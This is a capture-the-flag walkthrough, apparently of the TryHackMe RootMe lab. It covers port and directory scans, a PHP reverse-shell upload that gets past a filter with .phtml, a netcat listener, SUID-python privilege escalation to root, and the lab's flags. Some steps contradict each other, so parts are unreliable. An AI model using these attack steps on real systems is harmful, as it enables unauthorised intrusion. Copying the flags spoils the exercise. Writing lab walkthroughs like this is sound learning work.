## Task2 : Reconnaissance

#### Scan the machine, how many ports are open ?
`nmap -sV -sC 10.10.35.72`

> Starting Nmap 7.60 ( https://nmap.org ) at 2022-06-15 21:21 BST
> 
> Nmap scan report for ip-10-10-35-72.eu-west-1.compute.internal (10.10.35.72)
> 
> Host is up (0.048s latency).
> 
> Not shown: 998 closed ports
> 
> PORT   STATE SERVICE VERSION
> 
> **22/tcp open  ssh**     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
> 
> | ssh-hostkey: 
> 
> |   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
> 
> |   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
> 
> |\_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (EdDSA)
> 
> **80/tcp open**  http    Apache httpd 2.4.29 ((Ubuntu))
> 
> | http-cookie-flags: 
> 
> |   /: 
> 
> |     PHPSESSID: 
> 
> |\_      httponly flag not set
> 
> |\_http-server-header: **Apache/2.4.29** (Ubuntu)
> 
> |\_http-title: HackIT - Home
> 
> MAC Address: 02:D8:C2:12:3D:E3 (Unknown)
> 
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

#### What version of Apache is running ?
Apache httpd 2.4.29

#### What service is running on port 22 ?
SSH

#### Find directories on the web server using the GoBuster tool.

`gobuster dir -u http://10.10.35.72 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

> ===============================================================
> 
> Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
> 
> ===============================================================
> 
> [+] Url:            http://10.10.35.72
> 
> [+] Threads:        10
> 
> [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
> 
> [+] Status codes:   200,204,301,302,307,401,403
> 
> [+] User Agent:     gobuster/3.0.1
> 
> [+] Timeout:        10s
> 
> ===============================================================
> 
> 2022/06/15 21:25:26 Starting gobuster
> 
> ===============================================================
> 
> /uploads (Status: 301)
> 
> /css (Status: 301)
> 
> /js (Status: 301)
> 
> /panel (Status: 301)
> 
> /server-status (Status: 403)
> 
> ===============================================================
> 
> 2022/06/15 21:33:11 Finished

#### 5) What is the hidden directory ?

/panel/

## Task 3 : Getting a shell.

#### Find a form to upload and get a reverse shell, and find the flag (user.txt).

Let's visit the hidden directory :
http://10.10.35.72/panel/

There is an upload form.

Download https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Edit it and replace "127.0.0.1" with the IP address of the Attack machine.
Save the file as 'untitled.php' and upload it using the form at http://10.10.35.72/panel/

.PHP files are not allowed.

But .phtml is accepted.

Use netcat to listen on port 1234 :
`nc -lvnp 1234`
> Listening on [0.0.0.0] (family 0, port 1234)

Then visit http://10.10.35.72/uploads/untitled.php to get the reverse shell :

> Connection from 10.10.35.72 35562 received!
> 
> Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 20:53:00 up 35 min,  0 users,  load average: 0.00, 0.05, 0.57
> 
> USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
> 
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> 
> /bin/sh: 0: can't access tty; job control turned off

`whoami`

> www-data

`find / -type f -iname 'user.txt' 2>/dev/null`

> /var/www/user.txt

`cat /var/www/user.txt`

> THM{y0u_g0t_a_sh3ll}`

## Task 4 : Privilege escalation.

#### Search for files with SUID permission, which file is weird ?

`find / -user root -perm -4000 2>/dev/null`

> /usr/bin/python

#### Find a form to escalate your privileges.

Visit https://gtfobins.github.io/gtfobins/python/ --> SUID

> If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.
> 
> This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
>
> `sudo install -m =xs $(which python) .`
>
> `./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

`cd /usr/bin/`

`sudo install -m =xs $(which python) .`

`./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

`whoami`

> root

`find / -type f -iname "root.txt"`

> /root/root.txt

`cat /root/root.txt`

> THM{pr1v1l3g3_3sc4l4t10n}
